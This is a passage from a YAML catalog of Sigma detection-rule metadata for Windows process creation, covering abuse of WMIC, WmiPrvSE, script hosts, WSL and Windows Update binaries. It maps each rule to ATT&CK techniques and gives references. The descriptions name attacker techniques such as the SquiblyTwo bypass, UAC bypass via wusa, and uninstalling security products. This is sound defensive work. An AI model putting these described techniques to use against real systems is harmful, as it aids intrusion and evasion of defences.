  - https://www.trendmicro.com/en_us/research/25/c/socgholishs-intrusion-techniques-facilitate-distribution-of-rans.html
  false_positives:
  - Legitimate use of wmic.exe for reconnaissance of firewall, antivirus and antispywware
    products.
  notes: ''
- detection_id: 76f55eaa-d27f-4213-9d45-7b0e4b60bbae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_service.yml
  name: Service Reconnaissance Via Wmic.EXE
  description: 'An adversary might use WMI to check if a certain remote service is
    running on a remote device.

    When the test completes, a service information will be displayed on the screen
    if it exists.

    A common feedback message is that "No instance(s) Available" if the service queried
    is not running.

    A common error message is "Node - (provided IP or default) ERROR Description =The
    RPC server is unavailable" if the provided remote host is unreachable

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9d5a1274-922a-49d0-87f3-8c653483b909
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_system_info_uncommon.yml
  name: Uncommon System Information Discovery Via Wmic.EXE
  description: 'Detects the use of the WMI command-line (WMIC) utility to identify
    and display various system information,

    including OS, CPU, GPU, and disk drive names; memory capacity; display resolution;
    and baseboard, BIOS,

    and GPU driver products/versions.

    Some of these commands were used by Aurora Stealer in late 2022/early 2023.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/a2ccd19c37d0278b4ffa8583add3cf52060a5418/atomics/T1082/T1082.md#atomic-test-25---system-information-discovery-with-wmic
  - https://nwgat.ninja/getting-system-information-with-wmic-on-windows/
  - https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar
  - https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/
  - https://app.any.run/tasks/a6aa0057-82ec-451f-8f99-55650ca537da/
  - https://www.virustotal.com/gui/file/d6f6bc10ae0e634ed4301d584f61418cee18e5d58ad9af72f8aa552dc4aaeca3/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: 68bcd73b-37ef-49cb-95fc-edc809730be6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_unquoted_service_search.yml
  name: Potential Unquoted Service Path Reconnaissance Via Wmic.EXE
  description: Detects known WMI recon method to look for unquoted service paths using
    wmic. Often used by pentester and attacker enumeration scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://github.com/nccgroup/redsnarf/blob/35949b30106ae543dc6f2bc3f1be10c6d9a8d40e/redsnarf.py
  - https://github.com/S3cur3Th1sSh1t/Creds/blob/eac23d67f7f90c7fc8e3130587d86158c22aa398/PowershellScripts/jaws-enum.ps1
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c79da740-5030-45ec-a2e0-479e824a562c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_volume.yml
  name: System Disk And Volume Reconnaissance Via Wmic.EXE
  description: 'An adversary might use WMI to discover information about the system,
    such as the volume name, size,

    free space, and other disk information. This can be done using the ''wmic'' command-line
    utility and has been

    observed being used by threat actors such as Volt Typhoon.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1047
  - T1082
  tags:
  - attack.execution
  - attack.discovery
  - attack.t1047
  - attack.t1082
  time_window: ''
  references:
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7773b877-5abb-4a3e-b9c9-fd0369b59b00
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_remote_execution.yml
  name: WMIC Remote Command Execution
  description: Detects the execution of WMIC to query information on a remote system
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0b7163dc-7eee-4960-af17-c0cd517f92da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_service_manipulation.yml
  name: Service Started/Stopped Via Wmic.EXE
  description: Detects usage of wmic to start or stop a service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8d63dadf-b91b-4187-87b6-34a1114577ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_squiblytwo_bypass.yml
  name: Potential SquiblyTwo Technique Execution
  description: Detects potential SquiblyTwo attack technique with possible renamed
    WMIC via Imphash and OriginalFileName fields
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1059.005
  - T1059.007
  - T1220
  tags:
  - attack.defense-evasion
  - attack.t1047
  - attack.t1220
  - attack.execution
  - attack.t1059.005
  - attack.t1059.007
  time_window: ''
  references:
  - https://web.archive.org/web/20190209154607/https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html
  - https://twitter.com/mattifestation/status/986280382042595328
  - https://atomicredteam.io/defense-evasion/T1220/
  - https://lolbas-project.github.io/lolbas/Binaries/Wmic/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c453ab7a-1f5c-4716-a3b4-dea8135fb43a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_stdregprov_reg_modification.yml
  name: Registry Manipulation via WMI Stdregprov
  description: 'Detects the usage of wmic.exe to manipulate Windows registry via the
    WMI StdRegProv class.

    This behaviour could be potentially suspicious because it uses an alternative
    method to modify registry keys instead of legitimate registry tools like reg.exe
    or regedit.exe.

    Attackers specifically choose this technique to evade detection and bypass security
    monitoring focused on traditional registry modification commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  - Persistence
  techniques:
  - T1012
  - T1047
  - T1112
  tags:
  - attack.persistence
  - attack.execution
  - attack.defense-evasion
  - attack.discovery
  - attack.t1047
  - attack.t1112
  - attack.t1012
  time_window: ''
  references:
  - https://www.bitdefender.com/en-us/blog/businessinsights/shrinklocker-decryptor-from-friend-to-foe-and-back-again
  - https://trustedsec.com/blog/command-line-underdog-wmic-in-action
  - https://trustedsec.com/blog/wmi-for-script-kiddies
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: e1693bc8-7168-4eab-8718-cdcaa68a1738
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_susp_execution_via_office_process.yml
  name: Suspicious WMIC Execution Via Office Process
  description: Office application called wmic to proxye execution through a LOLBIN
    process. This is often used to break suspicious parent-child chain (Office app
    spawns LOLBin).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1204.002
  - T1218.010
  tags:
  - attack.t1204.002
  - attack.t1047
  - attack.t1218.010
  - attack.execution
  - attack.defense-evasion
  time_window: ''
  references:
  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/
  - https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3c89a1e8-0fba-449e-8f1b-8409d6267ec8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_susp_process_creation.yml
  name: Suspicious Process Created Via Wmic.EXE
  description: Detects WMIC executing "process call create" with suspicious calls
    to processes such as "rundll32", "regsrv32", etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://thedfirreport.com/2020/10/08/ryuks-return/
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker
  false_positives:
  - Unknown
  notes: ''
- detection_id: 49d9671b-0a0a-4c09-8280-d215bfd30662
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_terminate_application.yml
  name: Application Terminated Via Wmic.EXE
  description: Detects calls to the "terminate" function via wmic in order to kill
    an application
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://cyble.com/blog/lockfile-ransomware-using-proxyshell-attack-to-deploy-ransomware/
  - https://www.bitdefender.com/files/News/CaseStudies/study/377/Bitdefender-Whitepaper-WMI-creat4871-en-EN-GenericUse.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: b53317a0-8acf-4fd1-8de8-a5401e776b96
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_uninstall_application.yml
  name: Application Removed Via Wmic.EXE
  description: Detects the removal or uninstallation of an application via "Wmic.EXE".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md#atomic-test-10---application-uninstall-using-wmic
  false_positives:
  - Unknown
  notes: ''
- detection_id: 847d5ff3-8a31-4737-a970-aeae8fe21765
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_uninstall_security_products.yml
  name: Potential Tampering With Security Products Via WMIC
  description: Detects uninstallation or termination of security products using the
    WMIC utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://twitter.com/cglyer/status/1355171195654709249
  - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/
  - https://www.mandiant.com/resources/unc2165-shifts-to-evade-sanctions
  - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/
  - https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html
  false_positives:
  - Legitimate administration
  notes: ''
- detection_id: 05c36dd6-79d6-4a9a-97da-3db20298ab2d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
  name: XSL Script Execution Via WMIC.EXE
  description: 'Detects the execution of WMIC with the "format" flag to potentially
    load XSL files.

    Adversaries abuse this functionality to execute arbitrary files while potentially
    bypassing application whitelisting defenses.

    Extensible Stylesheet Language (XSL) files are commonly used to describe the processing
    and rendering of data within XML files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1220
  tags:
  - attack.defense-evasion
  - attack.t1220
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md
  false_positives:
  - WMIC.exe FP depend on scripts and administrative methods used in the monitored
    environment.
  - Static format arguments - https://petri.com/command-line-wmi-part-3
  notes: ''
- detection_id: d21374ff-f574-44a7-9998-4a8c8bf33d7d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmiprvse_spawning_process.yml
  name: WmiPrvSE Spawned A Process
  description: Detects WmiPrvSE spawning a process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190815-RemoteServiceInstallation/notebook.html
  false_positives:
  - False positives are expected (e.g. in environments where WinRM is used legitimately)
  notes: ''
- detection_id: 692f0bec-83ba-4d04-af7e-e884a96059b6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmiprvse_spawns_powershell.yml
  name: Potential WMI Lateral Movement WmiPrvSE Spawned PowerShell
  description: Detects Powershell as a child of the WmiPrvSE process. Which could
    be a sign of lateral movement via WMI.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1059.001
  tags:
  - attack.execution
  - attack.t1047
  - attack.t1059.001
  time_window: ''
  references:
  - https://any.run/report/68bc255f9b0db6a0d30a8f2dadfbee3256acfe12497bf93943bc1eab0735e45e/a2385d6f-34f7-403c-90d3-b1f9d2a90a5e
  false_positives:
  - AppvClient
  - CCM
  - WinRM
  notes: ''
- detection_id: 8a582fe2-0882-4b89-a82a-da6b2dc32937
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmiprvse_susp_child_processes.yml
  name: Suspicious WmiPrvSE Child Process
  description: Detects suspicious and uncommon child processes of WmiPrvSE
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1204.002
  - T1218.010
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1047
  - attack.t1204.002
  - attack.t1218.010
  time_window: ''
  references:
  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/
  - https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml
  - https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/
  - https://twitter.com/ForensicITGuy/status/1334734244120309760
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4abc0ec4-db5a-412f-9632-26659cddf145
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wpbbin_potential_persistence.yml
  name: UEFI Persistence Via Wpbbin - ProcessCreation
  description: Detects execution of the binary "wpbbin" which is used as part of the
    UEFI based persistence method described in the reference section
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1542.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1542.001
  time_window: ''
  references:
  - https://grzegorztworek.medium.com/using-uefi-to-inject-executable-files-into-bitlocker-protected-drives-8ff4ca59c94c
  - https://persistence-info.github.io/Data/wpbbin.html
  false_positives:
  - Legitimate usage of the file by hardware manufacturer such as lenovo (Thanks @0gtweet
    for the tip)
  notes: ''
- detection_id: cea72823-df4d-4567-950c-0b579eaf0846
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wscript_cscript_dropper.yml
  name: Potential Dropper Script Execution Via WScript/CScript
  description: Detects wscript/cscript executions of scripts located in user directories
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  - T1059.007
  tags:
  - attack.execution
  - attack.t1059.005
  - attack.t1059.007
  time_window: ''
  references:
  - https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/
  - https://redcanary.com/blog/gootloader/
  false_positives:
  - Some installers might generate a similar behavior. An initial baseline is required
  notes: ''
- detection_id: b6676963-0353-4f88-90f5-36c20d443c6a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wscript_cscript_susp_child_processes.yml
  name: Cscript/Wscript Potentially Suspicious Child Process
  description: 'Detects potentially suspicious child processes of Wscript/Cscript.
    These include processes such as rundll32 with uncommon exports or PowerShell spawning
    rundll32 or regsvr32.

    Malware such as Pikabot and Qakbot were seen using similar techniques as well
    as many others.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - Internal Research
  - https://github.com/pr0xylife/Pikabot/blob/fc58126127adf0f65e78f4eec59675523f48f086/Pikabot_30.10.2023.txt
  - https://github.com/pr0xylife/Pikabot/blob/fc58126127adf0f65e78f4eec59675523f48f086/Pikabot_22.12.2023.txt
  false_positives:
  - Some false positives might occur with admin or third party software scripts. Investigate
    and apply additional filters accordingly.
  notes: ''
- detection_id: 99b7460d-c9f1-40d7-a316-1f36f61d52ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wscript_cscript_uncommon_extension_exec.yml
  name: Cscript/Wscript Uncommon Script Extension Execution
  description: Detects Wscript/Cscript executing a file with an uncommon (i.e. non-script)
    extension
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  - T1059.007
  tags:
  - attack.execution
  - attack.t1059.005
  - attack.t1059.007
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2267fe65-0681-42ad-9a6d-46553d3f3480
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wsl_child_processes_anomalies.yml
  name: WSL Child Process Anomaly
  description: Detects uncommon or suspicious child processes spawning from a WSL
    process. This could indicate an attempt to evade parent/child relationship detections
    or persistence attempts via cron using WSL
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1202
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/
  - https://twitter.com/nas_bench/status/1535431474429808642
  false_positives:
  - Unknown
  notes: ''
- detection_id: eca8ae39-5c3c-4321-b538-9e64fe25822e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wsl_kali_linux_installation.yml
  name: Installation of WSL Kali-Linux
  description: 'Detects installation of Kali Linux distribution through Windows Subsystem
    for Linux (WSL).

    Attackers may use Kali Linux WSL to leverage its penetration testing tools and
    capabilities for malicious purposes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://medium.com/@redfanatic7/running-kali-linux-on-windows-51ad95166e6e
  - https://learn.microsoft.com/en-us/windows/wsl/install
  false_positives:
  - Legitimate installation or usage of Kali Linux WSL by administrators or security
    teams
  notes: ''
- detection_id: 6f1a11aa-4b8a-4b7f-9e13-4d3e4ff0e0d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wsl_kali_linux_usage.yml
  name: WSL Kali-Linux Usage
  description: Detects the use of Kali Linux through Windows Subsystem for Linux
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://medium.com/@redfanatic7/running-kali-linux-on-windows-51ad95166e6e
  - https://learn.microsoft.com/en-us/windows/wsl/install
  false_positives:
  - Legitimate installation or usage of Kali Linux WSL by administrators or security
    teams
  notes: ''
- detection_id: ed825c86-c009-4014-b413-b76003e33d35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wsl_windows_binaries_execution.yml
  name: Windows Binary Executed From WSL
  description: 'Detects the execution of Windows binaries from within a WSL instance.

    This could be used to masquerade parent-child relationships

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1202
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: af77cf95-c469-471c-b6a0-946c685c4798
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wuauclt_dll_loading.yml
  name: Proxy Execution Via Wuauclt.EXE
  description: Detects the use of the Windows Update Client binary (wuauclt.exe) for
    proxy execution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.execution
  time_window: ''
  references:
  - https://dtm.uk/wuauclt/
  - https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 52d097e2-063e-4c9c-8fbb-855c8948d135
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wuauclt_no_cli_flags_execution.yml
  name: Suspicious Windows Update Agent Empty Cmdline
  description: 'Detects suspicious Windows Update Agent activity in which a wuauclt.exe
    process command line doesn''t contain any command line flags

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://redcanary.com/blog/blackbyte-ransomware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c74c0390-3e20-41fd-a69a-128f0275a5ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wusa_cab_files_extraction_from_susp_paths.yml
  name: Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths
  description: 'Detects the execution of the "wusa.exe" (Windows Update Standalone
    Installer) utility to extract ".cab" files using the "/extract" argument from
    potentially suspicious paths.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html
  - https://www.echotrail.io/insights/search/wusa.exe/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ef64fc9c-a45e-43cc-8fd8-7d75d73b4c99
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wusa_susp_parent_execution.yml
  name: Wusa.EXE Executed By Parent Process Located In Suspicious Location
  description: 'Detects execution of the "wusa.exe" (Windows Update Standalone Installer)
    utility by a parent process that is located in a suspicious location.

    Attackers could instantiate an instance of "wusa.exe" in order to bypass User
    Account Control (UAC). They can duplicate the access token from "wusa.exe" to
    gain elevated privileges.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://www.fortinet.com/blog/threat-research/konni-campaign-distributed-via-malicious-document
  false_positives:
  - Unknown
  notes: ''
- detection_id: 193d5ccd-6f59-40c6-b5b0-8e32d5ddd3d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_xwizard_execution_non_default_location.yml
  name: Xwizard.EXE Execution From Non-Default Location
  description: 'Detects the execution of Xwizard tool from a non-default directory.

    When executed from a non-default directory, this utility can be abused in order
    to side load a custom version of "xwizards.dll".

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Xwizard/
